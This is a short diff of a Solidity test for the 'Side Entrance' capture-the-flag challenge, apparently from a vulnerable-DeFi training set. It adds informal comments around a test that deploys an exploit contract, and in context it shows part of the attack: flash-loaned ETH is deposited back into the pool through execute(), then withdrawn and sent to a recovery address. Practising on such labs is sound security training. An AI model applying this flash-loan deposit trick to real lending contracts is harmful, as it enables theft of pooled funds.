@@ -51,6 +51,8 @@ contract SideEntranceChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+    // @audit-info so here, I'm just basically lunching a contract and calling its function
+    // Note: the conract knows what do to 
     function test_sideEntrance() public checkSolvedByPlayer {
         exploit = new SideEntranceExploit(address(pool), address(recovery));
         exploit.exploit();
@@ -85,7 +87,6 @@ contract SideEntranceExploit {
         pool.withdraw();
         SafeTransferLib.safeTransferETH(recovery, address(this).balance);
     }
-    
     function execute() external payable {
         pool.deposit{value: msg.value}();
     }
